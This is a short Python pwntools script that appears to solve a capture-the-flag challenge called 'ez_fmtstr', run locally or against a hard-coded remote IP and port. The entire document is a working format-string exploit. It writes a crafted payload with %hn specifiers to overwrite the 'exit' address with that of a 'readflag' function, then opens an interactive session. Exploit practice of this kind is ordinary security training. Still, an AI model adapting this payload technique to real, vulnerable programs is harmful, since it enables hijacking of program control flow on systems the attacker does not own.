#!/usr/bin/env python
from pwn import *
import sys

HOST = '45.77.42.87'
PORT = 8080

def info(s):
	log.info(s)

def exploit(p):
	exit=0x0804A030
	readflag=0x080486AB
	payload=p32(exit)+p32(exit+2)+'%'+str(0x86ab-(0xf0-0xe8))+'x%5$hn'+'%'+str((0x0804-0x86ab)&0xffff)+'x%6$hn'
	p.sendline(payload)
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('/home/khongtrang/share/infosec/ez_fmtstr')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)